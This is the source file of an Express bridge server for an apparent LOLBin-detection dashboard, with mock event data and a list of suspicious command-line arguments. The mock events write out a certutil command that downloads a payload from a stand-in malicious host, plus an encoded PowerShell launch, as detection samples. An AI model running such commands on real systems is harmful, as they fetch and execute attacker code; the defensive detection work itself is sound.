// backend/server.js
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

// GO backend API URL (adjust if your Windows service is on a different port)
const GO_API_URL = 'http://localhost:8080/api';

// Middleware
app.use(express.json());
app.use(cors({
  origin: ['http://localhost:8080', 'http://localhost:5173'], // Allow frontend requests from common dev ports
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Logging middleware
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Add a root route to confirm the server is running
app.get('/', (req, res) => {
  res.json({
    status: 'Backend bridge is running',
    endpoints: [
      '/api/events',
      '/api/events/suspicious',
      '/api/events/recent',
      '/api/lolbins'
    ]
  });
});

// Add a test route with sample data
app.get('/api/test', (req, res) => {
  const testData = {
    message: 'Backend bridge is working correctly',
    timestamp: new Date().toISOString()
  };
  res.json(testData);
});

// Add a mock route for suspicious events if Go service unavailable
app.get('/api/mock/events/suspicious', (req, res) => {
  const mockEvents = [
    {
      process_id: 1234,
      parent_id: 800,
      command_line: "certutil.exe -urlcache -f http://malicious.com/payload.exe",
      executable_path: "C:\\Windows\\System32\\certutil.exe",
      timestamp: new Date().toISOString(),
      suspicious: true,
      is_lolbin: true,
      reason: "Suspicious use of certutil.exe with parameter containing '-urlcache'"
    },
    {
      process_id: 1235,
      parent_id: 900,
      command_line: "powershell.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAu",
      executable_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      timestamp: new Date(Date.now() - 300000).toISOString(),
      suspicious: true,
      is_lolbin: true,
      reason: "Suspicious use of powershell.exe with parameter containing '-e'"
    }
  ];
  res.json(mockEvents);
});

// API Routes that connect to Go service
app.get('/api/events/suspicious', async (req, res) => {
  try {
    console.log(`Attempting to fetch suspicious events from ${GO_API_URL}/events/suspicious`);
    const response = await axios.get(`${GO_API_URL}/events/suspicious`, { timeout: 5000 });
    console.log('Successfully fetched suspicious events');
    res.json(response.data);
  } catch (error) {
    console.error('Error fetching suspicious events:', error.message);
    // Fallback to mock data
    console.log('Falling back to mock data');
    res.redirect('/api/mock/events/suspicious');
  }
});

app.get('/api/events/recent', async (req, res) => {
  try {
    const response = await axios.get(`${GO_API_URL}/events/recent`, { timeout: 5000 });
    res.json(response.data);
  } catch (error) {
    console.error('Error fetching recent events:', error.message);
    res.status(500).json({ error: 'Failed to fetch recent events', details: error.message });
  }
});

app.get('/api/lolbins', async (req, res) => {
  try {
    const response = await axios.get(`${GO_API_URL}/lolbins`, { timeout: 5000 });
    res.json(response.data);
  } catch (error) {
    console.error('Error fetching LOLBin definitions:', error.message);
    // Provide mock LOLBin data as fallback
    const mockLOLBins = {
      "certutil.exe": {
        "name": "certutil.exe",
        "suspicious_args": ["-urlcache", "-decode", "-encode", "-decodehex"]
      },
      "powershell.exe": {
        "name": "powershell.exe",
        "suspicious_args": ["-e", "-enc", "-encodedcommand", "-nop", "-noprofile", "-w", "hidden"]
      },
      "rundll32.exe": {
        "name": "rundll32.exe",
        "suspicious_args": ["javascript:", "http://", "https://", ".dll,"]
      }
    };
    res.json(mockLOLBins);
  }
});

// Fallback for all events
app.get('/api/events', async (req, res) => {
  try {
    const response = await axios.get(`${GO_API_URL}/events`, { timeout: 5000 });
    res.json(response.data);
  } catch (error) {
    console.error('Error fetching all events:', error.message);
    res.status(500).json({ error: 'Failed to fetch all events', details: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Backend bridge server running on http://localhost:${PORT}`);
  console.log(`Attempting to forward requests to Go service at ${GO_API_URL}`);
  console.log('Test your bridge at: http://localhost:3000/api/test');
});